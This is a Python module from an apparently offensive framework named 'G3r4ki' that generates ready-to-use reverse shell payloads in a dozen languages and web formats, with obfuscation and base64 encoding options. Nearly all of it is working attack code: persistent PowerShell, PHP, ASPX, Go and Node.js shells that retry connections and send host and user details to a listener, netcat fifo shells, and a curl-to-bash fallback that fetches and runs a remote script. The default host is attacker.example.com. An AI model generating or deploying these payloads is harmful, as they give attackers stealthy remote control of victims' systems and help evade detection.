"""
G3r4ki Offensive Framework - Reverse Shell Generator Module

This module provides a comprehensive collection of reverse shell payloads for various platforms,
languages, and environments. It includes obfuscation capabilities and platform-specific optimizations.
"""

import base64
import random
import string
import os
from typing import Dict, List, Any, Optional, Tuple

# Module metadata
METADATA = {
    'name': 'Advanced Reverse Shell Generator',
    'description': 'Generates reverse shell payloads for various platforms and languages with obfuscation options',
    'author': 'G3r4ki Security Team',
    'version': '1.0.0',
    'dependencies': [],
    'tags': ['shells', 'remote_execution', 'payload_generation'],
    'platforms': ['linux', 'windows', 'macos'],
    'min_resources': {'cpu': 1, 'memory': 64},
    'stealth_level': 7,
    'effectiveness': 9,
    'complexity': 6,
    'supported_mission_types': ['stealth', 'loud', 'persistence', 'data_extraction']
}

class ReverseShellGenerator:
    """
    Generates reverse shell payloads with various options
    """
    
    def __init__(self, options: Optional[Dict[str, Any]] = None):
        """
        Initialize the generator
        
        Args:
            options: Optional configuration options
        """
        self.options = options or {}
        
        # Default options
        self.default_options = {
            'obfuscate': True,
            'encode': False,
            'platform_optimized': True
        }
        
        # Apply defaults for missing options
        for key, value in self.default_options.items():
            if key not in self.options:
                self.options[key] = value
    
    def generate_shell(self, shell_type: str, host: str, port: int, platform: str = 'linux') -> str:
        """
        Generate a reverse shell payload
        
        Args:
            shell_type: Type of shell to generate (bash, python, powershell, etc.)
            host: Listener host address
            port: Listener port
            platform: Target platform (linux, windows, macos)
            
        Returns:
            Generated shell payload
            
        Raises:
            ValueError: If shell type or platform is not supported
        """
        # Normalize shell type
        shell_type = shell_type.lower()
        
        # Get generator method based on shell type
        generator_method = getattr(self, f'_generate_{shell_type}_shell', None)
        if not generator_method:
            raise ValueError(f"Unsupported shell type: {shell_type}")
            
        # Generate shell
        shell = generator_method(host, port, platform)
        
        # Apply transformations
        if self.options.get('obfuscate', False):
            shell = self._obfuscate_shell(shell, shell_type, platform)
            
        if self.options.get('encode', False):
            shell = self._encode_shell(shell, shell_type, platform)
            
        return shell
        
    def list_available_shells(self) -> List[Dict[str, str]]:
        """
        List all available shell types
        
        Returns:
            List of dictionaries with shell information
        """
        shells = []
        
        for attr in dir(self):
            if attr.startswith('_generate_') and attr.endswith('_shell') and callable(getattr(self, attr)):
                shell_type = attr[len('_generate_'):-len('_shell')]
                method = getattr(self, attr)
                shells.append({
                    'type': shell_type,
                    'description': method.__doc__.strip() if method.__doc__ else f"Generate {shell_type} reverse shell"
                })
                
        return shells
    
    def _obfuscate_shell(self, shell: str, shell_type: str, platform: str) -> str:
        """
        Apply obfuscation techniques to a shell payload
        
        Args:
            shell: Shell payload to obfuscate
            shell_type: Type of shell
            platform: Target platform
            
        Returns:
            Obfuscated shell payload
        """
        # Apply shell-specific obfuscation
        obfuscation_method = getattr(self, f'_obfuscate_{shell_type}', None)
        if obfuscation_method:
            return obfuscation_method(shell, platform)
            
        # Default obfuscation (variable renaming, whitespace manipulation)
        if shell_type in ['bash', 'sh']:
            # Add random comments, newlines, and backslash continuations
            lines = shell.split('\n')
            obfuscated_lines = []
            
            for line in lines:
                if line.strip():
                    # Random chance to add a comment
                    if random.random() < 0.3:
                        comment = '# ' + ''.join(random.choices(string.ascii_letters, k=random.randint(5, 20)))
                        line = line + ' ' + comment
                        
                    # Random chance to add a backslash continuation
                    if random.random() < 0.3 and not line.strip().startswith('#'):
                        line = line + ' \\'
                        obfuscated_lines.append(line)
                        # Add random whitespace on next line
                        obfuscated_lines.append(' ' * random.randint(2, 8))
                        continue
                        
                obfuscated_lines.append(line)
                
            return '\n'.join(obfuscated_lines)
            
        elif shell_type in ['python', 'python3']:
            # Add random variable names, comments, and newlines
            import re
            
            # Replace common variable names with random ones
            var_names = re.findall(r'\b([a-zA-Z_][a-zA-Z0-9_]*)\b', shell)
            var_names = set(var_names) - set(['import', 'from', 'as', 'try', 'except', 'finally', 'with', 'for', 'in', 'if', 'else', 'while', 'def', 'class', 'return', 'True', 'False', 'None'])
            
            replacements = {}
            for var in var_names:
                if len(var) > 3 and random.random() < 0.7:  # Don't replace all variables
                    replacements[var] = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 12)))
                    
            obfuscated = shell
            for old, new in replacements.items():
                obfuscated = re.sub(rf'\b{old}\b', new, obfuscated)
                
            # Add random comments
            lines = obfuscated.split('\n')
            for i in range(len(lines)):
                if lines[i].strip() and random.random() < 0.3:
                    comment = '# ' + ''.join(random.choices(string.ascii_letters, k=random.randint(5, 20)))
                    lines[i] = lines[i] + ' ' + comment
                    
            return '\n'.join(lines)
            
        elif shell_type in ['powershell', 'pwsh']:
            # Obfuscate PowerShell with case changes, backtick insertion, variable substitution
            import re
            
            # Mix case for cmdlets and parameters
            for cmdlet in ['Invoke-Expression', 'New-Object', 'Out-String', 'Write-Output']:
                if cmdlet in shell:
                    mixed_case = ''.join([c.upper() if random.random() < 0.5 else c.lower() for c in cmdlet])
                    shell = shell.replace(cmdlet, mixed_case)
                    
            # Insert backticks in random positions (PowerShell's line continuation)
            tokens = re.findall(r'[\w\-]+|[^\w\-]+', shell)
            for i in range(len(tokens)):
                if tokens[i].isalnum() and len(tokens[i]) > 3 and random.random() < 0.2:
                    pos = random.randint(1, len(tokens[i])-1)
                    tokens[i] = tokens[i][:pos] + '`' + tokens[i][pos:]
                    
            return ''.join(tokens)
        
        # If no specific obfuscation, return original
        return shell
    
    def _encode_shell(self, shell: str, shell_type: str, platform: str) -> str:
        """
        Apply encoding to a shell payload
        
        Args:
            shell: Shell payload to encode
            shell_type: Type of shell
            platform: Target platform
            
        Returns:
            Encoded shell payload with decoder prefix
        """
        # Base64 encode with appropriate decoder prefix
        if shell_type in ['bash', 'sh']:
            encoded = base64.b64encode(shell.encode()).decode()
            return f'echo {encoded} | base64 -d | bash'
            
        elif shell_type in ['python', 'python3']:
            encoded = base64.b64encode(shell.encode()).decode()
            return f'''import base64
exec(base64.b64decode("{encoded}").decode())'''
            
        elif shell_type in ['powershell', 'pwsh']:
            encoded = base64.b64encode(shell.encode('utf-16-le')).decode()
            return f'powershell -EncodedCommand {encoded}'
            
        # If no specific encoding, return original
        return shell
    
    def _generate_bash_shell(self, host: str, port: int, platform: str) -> str:
        """Generate a Bash reverse shell"""
        if platform not in ['linux', 'macos']:
            raise ValueError(f"Bash shell not supported on {platform}")
            
        # Standard Bash reverse shell
        shell = f'''bash -i >& /dev/tcp/{host}/{port} 0>&1'''
        
        # Add fallbacks for platform-optimized version
        if self.options.get('platform_optimized', True):
            shell = f'''#!/bin/bash
# G3r4ki Advanced Bash Reverse Shell
# Attempts multiple methods for reverse shell connection

# TCP Socket method
if [[ -e /dev/tcp && -w /dev/tcp ]]; then
    bash -i >& /dev/tcp/{host}/{port} 0>&1
    exit 0
fi

# Netcat method
if command -v nc >/dev/null 2>&1; then
    nc -e /bin/bash {host} {port} || nc -c /bin/bash {host} {port} || nc {host} {port} -e /bin/bash
    exit 0
fi

# Python method
if command -v python >/dev/null 2>&1; then
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'
    exit 0
fi

# Perl method
if command -v perl >/dev/null 2>&1; then
    perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}};'
    exit 0
fi

# Ruby method
if command -v ruby >/dev/null 2>&1; then
    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{host}",{port});while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'
    exit 0
fi

# PHP method
if command -v php >/dev/null 2>&1; then
    php -r '$sock=fsockopen("{host}",{port});exec("/bin/bash -i <&3 >&3 2>&3");'
    exit 0
fi

# Last resort: curl pipe to bash
if command -v curl >/dev/null 2>&1; then
    # This assumes you have a reverse shell script hosted at http://{host}:8080/shell.sh
    curl -s http://{host}:8080/shell.sh | bash
    exit 0
fi'''
            
        return shell
    
    def _generate_python_shell(self, host: str, port: int, platform: str) -> str:
        """Generate a Python reverse shell"""
        # Basic Python reverse shell
        shell = f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{host}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh" if "{platform}" in ["linux", "macos"] else "cmd.exe","-i"])
'''
        
        # Platform-optimized version
        if self.options.get('platform_optimized', True):
            if platform == 'windows':
                shell = f'''import socket,subprocess,os,time,sys,platform

def create_connection():
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("{host}",{port}))
        return s
    except:
        return None

def get_shell():
    if platform.system().lower() == "windows":
        return "cmd.exe"
    else:
        return "/bin/sh"

def main():
    shell = get_shell()
    connected = False
    
    # Retry connection every 30 seconds
    while not connected:
        try:
            s = create_connection()
            if s:
                os.dup2(s.fileno(),0)
                os.dup2(s.fileno(),1)
                os.dup2(s.fileno(),2)
                connected = True
                subprocess.call([shell,"-i"])
                s.close()
                break
        except:
            pass
            
        # Sleep and retry
        try:
            time.sleep(30)
        except:
            pass

if __name__ == "__main__":
    main()
'''
        
        return shell
    
    def _generate_powershell_shell(self, host: str, port: int, platform: str) -> str:
        """Generate a PowerShell reverse shell"""
        if platform != 'windows':
            platform = 'windows'  # Force Windows platform for PowerShell
            
        # Basic PowerShell reverse shell
        shell = f'''$client = New-Object System.Net.Sockets.TCPClient("{host}",{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}}
$client.Close();'''
        
        # Platform-optimized version
        if self.options.get('platform_optimized', True):
            shell = f'''function Start-ReverseShell {{
    param (
        [string]$IPAddress = "{host}",
        [int]$Port = {port},
        [int]$RetryIntervalSeconds = 30
    )

    while ($true) {{
        try {{
            $client = $null
            $stream = $null
            $networkStream = $null
            $reader = $null
            $writer = $null
            
            # Try to connect to C2 server
            try {{
                $client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
                $stream = $client.GetStream()
                $networkStream = $client.GetStream()
                $reader = New-Object System.IO.StreamReader($networkStream)
                $writer = New-Object System.IO.StreamWriter($networkStream)
                $writer.AutoFlush = $true
                $buffer = New-Object System.Byte[] 1024
                $encoding = New-Object System.Text.AsciiEncoding

                # Send system info
                $computerInfo = "Host: $env:COMPUTERNAME / User: $env:USERNAME / OS: $(Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Caption) / IP: $((Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object {{$_.IPAddress -ne $null}}).IPAddress | Select-Object -First 1)"
                $writer.WriteLine($computerInfo)
                $writer.WriteLine("PS $pwd> ")
            }}
            catch {{
                # If connection fails, retry after interval
                Start-Sleep -Seconds $RetryIntervalSeconds
                continue
            }}

            # Main command execution loop
            while (($command = $reader.ReadLine()) -ne $null) {{
                try {{
                    if ($command.ToLower() -eq "exit") {{
                        break
                    }}
                    
                    # Execute command and capture output
                    $output = Invoke-Expression $command 2>&1 | Out-String
                    $writer.WriteLine($output)
                    $writer.WriteLine("PS $pwd> ")
                }}
                catch {{
                    $errorMessage = $_.Exception.Message | Out-String
                    $writer.WriteLine($errorMessage)
                    $writer.WriteLine("PS $pwd> ")
                }}
            }}
        }}
        catch {{
            # Connection lost or error, cleanup and retry
        }}
        finally {{
            # Clean up resources
            if ($reader -ne $null) {{ $reader.Close() }}
            if ($writer -ne $null) {{ $writer.Close() }}
            if ($networkStream -ne $null) {{ $networkStream.Close() }}
            if ($client -ne $null) {{ $client.Close() }}
            
            # Wait before retrying
            Start-Sleep -Seconds $RetryIntervalSeconds
        }}
    }}
}}

# Start the reverse shell with default parameters
Start-ReverseShell
'''
        
        return shell
    
    def _generate_php_shell(self, host: str, port: int, platform: str) -> str:
        """Generate a PHP reverse shell"""
        # Basic PHP reverse shell
        shell = f'''<?php
$sock=fsockopen("{host}",{port});
exec("/bin/sh -i <&3 >&3 2>&3");
?>'''

        # Platform-optimized version
        if self.options.get('platform_optimized', True):
            shell = f'''<?php
// G3r4ki Advanced PHP Reverse Shell

// Configuration
$ip = '{host}';     // Listener IP
$port = {port};   // Listener Port
$retry_delay = 30;  // Retry connection every X seconds
$shell_cmd = PHP_OS === 'WINNT' ? 'cmd.exe' : '/bin/sh';

// System info gathering
function get_system_info() {{
    $info = [
        'Host' => php_uname('n'),
        'OS' => php_uname('s') . ' ' . php_uname('r'),
        'User' => get_current_user(),
        'PHP' => phpversion(),
        'CWD' => getcwd(),
    ];
    
    // Get IP address
    if (function_exists('shell_exec')) {{
        $ip_cmd = PHP_OS === 'WINNT' ? 'ipconfig' : 'ifconfig || ip a';
        $ip_info = shell_exec($ip_cmd);
        $info['Network'] = preg_replace('/\\s+/', ' ', $ip_info);
    }}
    
    return $info;
}}

// Create a reverse shell connection
function create_reverse_shell($ip, $port, $retry_delay, $shell_cmd) {{
    // Keep trying to connect
    while (true) {{
        $socket = @fsockopen($ip, $port, $errno, $errstr, 30);
        
        if ($socket) {{
            $system_info = get_system_info();
            fwrite($socket, "--- G3r4ki PHP Reverse Shell Connected ---\\n");
            foreach ($system_info as $key => $value) {{
                fwrite($socket, "$key: $value\\n");
            }}
            fwrite($socket, "-------------------------------------------\\n\\n");
            
            // Execute commands
            while (!feof($socket)) {{
                // Read command
                $command = trim(fgets($socket));
                
                // Exit command
                if ($command == 'exit') {{
                    break;
                }}
                
                // Execute command
                if (function_exists('system')) {{
                    ob_start();
                    system("$command 2>&1", $return_value);
                    $output = ob_get_contents();
                    ob_end_clean();
                }} elseif (function_exists('shell_exec')) {{
                    $output = shell_exec("$command 2>&1");
                }} elseif (function_exists('exec')) {{
                    exec("$command 2>&1", $output_array, $return_value);
                    $output = implode("\\n", $output_array);
                }} elseif (function_exists('passthru')) {{
                    ob_start();
                    passthru("$command 2>&1", $return_value);
                    $output = ob_get_contents();
                    ob_end_clean();
                }} elseif (function_exists('proc_open')) {{
                    $descriptorspec = array(
                       0 => array("pipe", "r"),
                       1 => array("pipe", "w"),
                       2 => array("pipe", "w")
                    );
                    $process = proc_open($command, $descriptorspec, $pipes);
                    $output = stream_get_contents($pipes[1]);
                    fclose($pipes[0]);
                    fclose($pipes[1]);
                    fclose($pipes[2]);
                    proc_close($process);
                }} else {{
                    $output = "Command execution not available";
                }}
                
                fwrite($socket, $output . "\\n");
            }}
            
            fclose($socket);
        }}
        
        // Wait before retry
        sleep($retry_delay);
    }}
}}

// Start reverse shell
create_reverse_shell($ip, $port, $retry_delay, $shell_cmd);
?>'''
        
        return shell
    
    def _generate_perl_shell(self, host: str, port: int, platform: str) -> str:
        """Generate a Perl reverse shell"""
        shell = f'''use Socket;
$i="{host}";
$p={port};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){{
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
}};'''
        
        return shell
    
    def _generate_ruby_shell(self, host: str, port: int, platform: str) -> str:
        """Generate a Ruby reverse shell"""
        shell = f'''require 'socket'
s=TCPSocket.new("{host}",{port})
while(cmd=s.gets)
  IO.popen(cmd,"r"){{|io|s.print io.read}}
end'''
        
        return shell
    
    def _generate_netcat_shell(self, host: str, port: int, platform: str) -> str:
        """Generate a Netcat reverse shell"""
        if platform == 'windows':
            shell = f'nc.exe {host} {port} -e cmd.exe'
        else:
            shell = f'''nc -e /bin/sh {host} {port}

# Fallback if -e is not supported
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f'''
        
        return shell
    
    def _generate_java_shell(self, host: str, port: int, platform: str) -> str:
        """Generate a Java reverse shell"""
        shell = f'''public class Reverse {{
    public static void main(String[] args) throws Exception {{
        Runtime r = Runtime.getRuntime();
        String cmd = "{'/bin/sh' if platform in ['linux', 'macos'] else 'cmd.exe'}";
        Process p = r.exec(new String[] {{cmd, "-c", "exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"}});
        p.waitFor();
    }}
}}'''
        
        return shell
    
    def _generate_jsp_shell(self, host: str, port: int, platform: str) -> str:
        """Generate a JSP reverse shell"""
        shell = f'''<%@ page import="java.io.*" %>
<%
    String host="{host}";
    int port={port};
    String cmd = "{'/bin/sh' if platform in ['linux', 'macos'] else 'cmd.exe'}";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s=new Socket(host,port);
    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
    while(!s.isClosed()){{
        while(pi.available()>0)
            so.write(pi.read());
        while(pe.available()>0)
            so.write(pe.read());
        while(si.available()>0)
            po.write(si.read());
        so.flush();
        po.flush();
        Thread.sleep(50);
        try {{
            p.exitValue();
            break;
        }}
        catch (Exception e){{}}
    }};
    p.destroy();
    s.close();
%>'''
        
        return shell
    
    def _generate_aspx_shell(self, host: str, port: int, platform: str) -> str:
        """Generate an ASP.NET reverse shell"""
        shell = f'''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {{
        string host = "{host}";
        int port = {port};
        
        // Create a TCP socket connection
        Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        sock.Connect(host, port);
        
        // Create streams
        NetworkStream stream = new NetworkStream(sock);
        StreamReader reader = new StreamReader(stream);
        StreamWriter writer = new StreamWriter(stream);
        
        // Send system info
        writer.WriteLine("G3r4ki ASPX Reverse Shell");
        writer.WriteLine("Machine: " + Environment.MachineName);
        writer.WriteLine("User: " + WindowsIdentity.GetCurrent().Name);
        writer.WriteLine(Directory.GetCurrentDirectory());
        writer.Flush();
        
        // Command execution loop
        while (true)
        {{
            string cmd = reader.ReadLine();
            if (cmd == "exit")
                break;
                
            Process proc = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "/c " + cmd;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.RedirectStandardError = true;
            proc.Start();
            
            string output = proc.StandardOutput.ReadToEnd();
            string error = proc.StandardError.ReadToEnd();
            proc.WaitForExit();
            
            writer.WriteLine(output + error);
            writer.Flush();
        }}
        
        sock.Close();
    }}
</script>'''
        
        return shell
    
    def _generate_golang_shell(self, host: str, port: int, platform: str) -> str:
        """Generate a Golang reverse shell"""
        shell = f'''package main

import (
    "net"
    "os/exec"
    "runtime"
    "time"
)

func main() {{
    for {{
        c, err := net.Dial("tcp", "{host}:{port}")
        if err != nil {{
            // Connection failed, retry after delay
            time.Sleep(30 * time.Second)
            continue
        }}
        
        // Select the appropriate shell based on the OS
        var cmd *exec.Cmd
        if runtime.GOOS == "windows" {{
            cmd = exec.Command("cmd.exe")
        }} else {{
            cmd = exec.Command("/bin/sh", "-i")
        }}
        
        // Connect stdin/stdout/stderr to the TCP connection
        cmd.Stdin = c
        cmd.Stdout = c
        cmd.Stderr = c
        
        // Run the shell
        cmd.Run()
        
        // Clean up and retry
        c.Close()
        time.Sleep(30 * time.Second)
    }}
}}'''
        
        return shell
    
    def _generate_nodejs_shell(self, host: str, port: int, platform: str) -> str:
        """Generate a Node.js reverse shell"""
        shell = f'''(function(){{
    const net = require("net");
    const cp = require("child_process");
    const sh = {'"cmd.exe"' if platform == 'windows' else '"/bin/sh"'};
    
    // Function to create a connection with retry
    function connectWithRetry() {{
        const client = new net.Socket();
        client.connect({port}, "{host}", function() {{
            client.write("G3r4ki Node.js Reverse Shell\\n");
            
            const shell = cp.spawn(sh, []);
            client.pipe(shell.stdin);
            shell.stdout.pipe(client);
            shell.stderr.pipe(client);
            
            shell.on('exit', function(code) {{
                client.end(`Shell exited with code ${{code}}\\n`);
                setTimeout(connectWithRetry, 30000); // Retry after 30 seconds
            }});
        }});
        
        client.on('error', function(err) {{
            setTimeout(connectWithRetry, 30000); // Retry after 30 seconds
        }});
    }}
    
    // Start the connection process
    connectWithRetry();
}})();'''
        
        return shell


def execute(context: Dict[str, Any]) -> Dict[str, Any]:
    """
    Execute the reverse shell generator module
    
    Args:
        context: Execution context
            - 'target': Target information
            - 'options': Module options
    
    Returns:
        Dict containing execution results
    """
    # Extract options from context
    options = context.get('options', {})
    
    # Initialize generator
    generator = ReverseShellGenerator(options)
    
    results = {
        'status': 'success',
        'message': 'Generated reverse shell payloads',
        'shells': {}
    }
    
    # Generate requested shells
    shell_types = options.get('shell_types', ['bash', 'python', 'powershell'])
    host = options.get('host', 'attacker.example.com')
    port = options.get('port', 4444)
    platform = options.get('platform', 'linux')
    
    try:
        for shell_type in shell_types:
            results['shells'][shell_type] = generator.generate_shell(shell_type, host, port, platform)
    except Exception as e:
        results['status'] = 'error'
        results['message'] = f'Error generating shells: {str(e)}'
    
    return results